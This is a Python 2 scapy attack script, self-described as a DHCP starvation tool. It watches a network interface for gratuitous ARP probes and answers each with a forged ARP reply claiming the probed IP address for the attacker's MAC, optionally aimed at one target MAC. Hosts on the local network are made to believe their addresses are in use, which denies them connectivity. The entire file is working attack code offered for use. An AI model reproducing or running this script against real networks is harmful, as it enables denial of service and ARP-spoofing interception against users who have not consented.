#!/usr/bin/env python

from base import Base
from argparse import ArgumentParser
from sys import exit
from scapy.all import sniff, Ether, ARP, sendp
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)

Base.check_user()

parser = ArgumentParser(description='DHCP Starvation attack script')
parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
parser.add_argument('-p', '--packets', type=int, help='Number of packets (default: 100000)', default=100000)
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
args = parser.parse_args()

_number_of_packets = int(args.packets)
_current_number_of_packets = 0

_current_network_interface = ""
if args.interface is None:
    _current_network_interface = Base.netiface_selection()
else:
    _current_network_interface = args.interface

_current_mac_address = Base.get_netiface_mac_address(_current_network_interface)
if _current_mac_address is None:
    print "This network interface does not have mac address!"
    exit(1)

_target_mac_address = None
if args.target_mac is not None:
    _target_mac_address = args.target_mac


def send_arp_reply(request):
    if request.haslayer(ARP):
        global _current_number_of_packets
        global _current_network_interface
        global _current_mac_address

        if request[ARP].op == 1:
            if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                print "[INFO] Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
                sendp(Ether(dst=request[ARP].hwsrc, src=_current_mac_address)
                      / ARP(hwsrc=_current_mac_address, psrc=request[ARP].pdst,
                            hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2),
                      iface=_current_network_interface, verbose=False)
                _current_number_of_packets += 1
                if _current_number_of_packets >= _number_of_packets:
                    exit(0)


if __name__ == "__main__":
    print "Sniffing interface: " + str(_current_network_interface)
    if _target_mac_address is None:
        sniff(filter="arp", prn=send_arp_reply, iface=_current_network_interface)
    else:
        sniff(lfilter=lambda d: d.src == _target_mac_address,
              filter="arp", prn=send_arp_reply, iface=_current_network_interface)
